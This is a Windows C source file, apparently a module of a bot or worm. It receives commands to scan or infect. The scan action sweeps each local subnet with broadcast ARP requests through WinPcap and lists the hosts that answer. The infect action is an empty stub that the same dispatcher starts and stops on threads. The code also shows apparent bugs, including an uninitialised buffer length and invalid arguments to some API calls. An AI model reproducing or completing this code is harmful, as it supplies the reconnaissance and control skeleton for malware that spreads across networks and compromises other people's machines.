#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define HAVE_REMOTE
#define WPCAP
#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#include <Windows.h>
#include <malloc.h>
#include <wchar.h>

#include "commands.h"

typedef struct
{
	pcap_t* fp;
	PIP_ADAPTER_INFO adapter;
}send_params;

//globals
static HANDLE act_threads[ACTS_NUM];
static send_params parameters;

static PIP_ADAPTER_INFO correspoding_adapter(pcap_if_t* pcap_adapter, PIP_ADAPTER_INFO pAdapters)
{
	const char* str1 = pcap_adapter->name;
	const char* str2;
	size_t i;
	
	str1 += strlen(str1) - 1; 
	while (pAdapters)
	{
		i = 0;
		str2 = pAdapters->AdapterName;
		str2 += strlen(str2) - 1;

		while (*(str1-i) == *(str2-i) && *(str1-i) != '{')
			i++;

		if (*(str1-i) == *(str2-i))
			return pAdapters;

		pAdapters = pAdapters->Next;
	}
	return NULL;
}

static DWORD WINAPI send_packets(LPVOID lparam)
{
	PIP_ADDR_STRING addr_lst;
	ether_hdr* ether_header;
	arp_ether_ipv4* arp_header;
	u_char packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	
	addr_lst = &parameters.adapter->IpAddressList;
	ether_header = (ether_hdr*)packet;
	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));

	//ETHERNET LAYER
	memcpy(ether_header->src_addr, parameters.adapter->Address, ETH_ALEN); //this adapter's mac
	memset(ether_header->dest_addr, 0xff, ETH_ALEN); //broadcast
	ether_header->frame_type = htons(ETH_P_ARP); //LAYER3:ARP (0x0806)

	//NETWORK LAYER
	arp_header->htype = htons(ARP_HTYPE_ETHER);
	arp_header->ptype = htons(ARP_PTYPE_IPv4);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->op = htons(1); // who has
	memcpy(arp_header->sha, ether_header->src_addr, ETH_ALEN);
	memset(arp_header->tha, 0, ETH_ALEN);

	u_long target;
	u_long netmask;

	while (addr_lst)
	{
		inet_pton(AF_INET, addr_lst->IpMask.String, &netmask);
		inet_pton(AF_INET, addr_lst->IpAddress.String, &target);

		netmask = htonl(netmask);
		target = htonl(target);
		target &= netmask;

		inet_pton(AF_INET, addr_lst->IpAddress.String, &arp_header->spa);
		while (netmask != 0xffffffff)
		{
			arp_header->tpa = htonl(target);
			pcap_sendpacket(parameters.fp, packet, sizeof(packet));
			target++;
			netmask++;
		}

		addr_lst = addr_lst->Next;
	}
	return 0;
}

DWORD WINAPI scan(LPVOID lparam)
{
	pCommand command = (pCommand)lparam;
	
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG outBufLen;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
	if (!pAdapterInfo)
		return 1;
	GetAdaptersInfo(pAdapterInfo, &outBufLen);

	pcap_t* fp;
	pcap_if_t* const alldevs, * temp;
	struct pcap_addr* addr;
	struct bpf_program fcode;
	int res;
	struct pcap_pkthdr* pkt_header;
	const u_char* pkt_data = NULL;
	ULONG32 netmask;

	pcap_findalldevs(&alldevs, NULL);
	
	for (temp = alldevs; temp; temp = temp->next)
	{
		/*open the adapter*/
		fp = pcap_open(
			temp->name,
			sizeof(ether_hdr) + sizeof(arp_ether_ipv4),
			PCAP_OPENFLAG_PROMISCUOUS,
			1000,
			NULL,
			NULL
		);

		if (temp->addresses != NULL)
			/* Retrieve the mask of the first address of the interface */
			netmask = ((struct sockaddr_in*)(temp->addresses->netmask))->sin_addr.S_un.S_addr;
		else
			/* If the interface is without addresses we suppose to be in a C class network */
			netmask = 0xffffff;

		/*Filter arp packets only*/
		if (pcap_compile(fp, &fcode, "arp", 1, netmask) < 0)
		{
			fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return -1;
		}

		/*Set the filter*/
		if (pcap_setfilter(fp, &fcode) < 0)
		{
			fprintf(stderr, "\nError setting the filter.\n");
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return -1;
		}

		/*update globals for send_packet*/
		parameters.adapter = correspoding_adapter(temp, pAdapterInfo);
		parameters.fp = fp;

		/*start send_packet thread*/
		HANDLE hThread;
		hThread = CreateThread(NULL, 0, send_packets, NULL, 0, NULL);
		if (!hThread)
		{
			pcap_close(fp);
			continue;
		}

		ether_hdr* ether_header;
		arp_ether_ipv4* arp_header;

		/* Retrieve the packets */
		while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0) {

			/* Timeout elapsed */
			if (res == 0)
			{
				if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
				{
					CloseHandle(hThread);
					break;
				}
				continue;
			}

			ether_header = (ether_hdr*)pkt_data;
			arp_header = (arp_ether_ipv4*)(pkt_data + sizeof(ether_hdr));

			struct in_addr a;
			if (arp_header->op == htons(2))
			{
				a.s_addr = arp_header->spa;
				printf("%s %s\n", "reply from ip:", inet_ntoa(a));
			}
		}
		//close adapter
		pcap_close(fp);
	}

	free(pAdapterInfo);
	pcap_freealldevs(alldevs);
	
	return 0;
}

DWORD WINAPI infect(LPVOID lparam)
{
	pCommand command = (pCommand)lparam;
	return 0;
}

void execute_command(pCommand command)
{
	
	switch (command->act)
	{
	case SCAN:
		//check if thread not active
		if (GetExitCodeThread(act_threads[SCAN], NULL) != STILL_ACTIVE)
		{
			act_threads[SCAN] = CreateThread(
				NULL,
				0,
				scan,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case INFECT:
		//check if thread not active
		if (GetExitCodeThread(act_threads[INFECT], NULL) != STILL_ACTIVE)
		{
			act_threads[INFECT] = CreateThread(
				NULL,
				0,
				infect,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case STOP_S:
		TerminateThread(act_threads[SCAN], 0);
		break;
	case STOP_I:
		TerminateThread(act_threads[INFECT], 0);
		break;
	case STOP_A:
		TerminateThread(act_threads[SCAN], 0);
		TerminateThread(act_threads[INFECT], 0);
		break;
	}
	
}